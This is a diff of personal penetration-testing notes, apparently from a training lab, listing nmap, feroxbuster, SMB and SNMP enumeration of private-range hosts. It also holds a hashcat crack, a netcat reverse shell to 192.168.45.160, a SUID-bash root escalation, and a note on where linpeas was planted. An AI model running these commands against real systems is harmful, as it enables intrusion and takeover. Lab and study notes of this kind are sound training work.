@@ -39,9 +39,10 @@ feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-wor
 .221 (austin02.SKYLARK.com)
 ```
 nmap 192.168.240.221
-nmap -sT -A -p 80,443 192.168.240.221
-nmap -p 1000-60000 192.168.240.221
-# port 3387, 5504 open
+nmap -sT -A -p 80,443 192.168.248.221
+sudo nmap -p- -Pn 192.168.248.221 -sS -T 5 --verbose
+# port 80,443,135,139,445,3387,5504,5985(wsman) open
+# also port 47001,49664,49665,49666,49667,49668,49670-75,49680
 
 # enumerate port 10000 (i don't think it's actually ndmp, but another rdp port)
 nmap -n -sV --script "ndmp-fs-info or ndmp-version" -p 10000 192.168.240.221
@@ -73,7 +74,7 @@ smbclient -L 192.168.213.222
 smbmap -H 192.168.213.222
 ```
 
-.223 (milan)
+.223 (milan) (standalone)
 ```
 nmap 192.168.213.223
 sudo nmap -sU --open -p 161 192.168.213.223
@@ -182,4 +183,39 @@ hashcat -m 7400 flybike.hash /usr/share/wordlists/rockyou.txt
 nc -e bash 192.168.45.160 443
 chmod u+s /usr/bin/bash
 bash -p
+
+# where I installed linpeas
+/var/www/html/oscommerce/catalog/install/includes
+```
+
+.224
+```
+nmap 192.168.248.224
+sudo nmap -sU --open -p 161 192.168.248.224
+sudo nmap -p- -Pn 192.168.248.224 -sS -T 5 --verbose
+nmap -sT -A -p 8000,3128 192.168.248.224
+
+# ports open: 22, 3128 (squid), 8000
+
+# enumerate squid - Squid http proxy 4.10
+# https://book.hacktricks.xyz/network-services-pentesting/3128-pentesting-squid
+# Squid is a caching and forwarding HTTP web proxy.
+
+# enumerate webserver
+whatweb 192.168.248.224:8000
+
+feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --url http://192.168.248.224:8000
+# find http://192.168.248.224:8000/debug.txt, is just output of ifconfig, showing connection to interntal 172.x network
+```
+
+.225 (standalone)
+```
+nmap 192.168.248.225
+sudo nmap -sU --open -p 161 192.168.248.225
+sudo nmap -p- -Pn 192.168.248.225 -sS -T 5 --verbose
+nmap -sT -A -p 80,8090 192.168.248.225
+
+# open ports: 21, 80, 8090
+
+# enumerate ftp
 ```
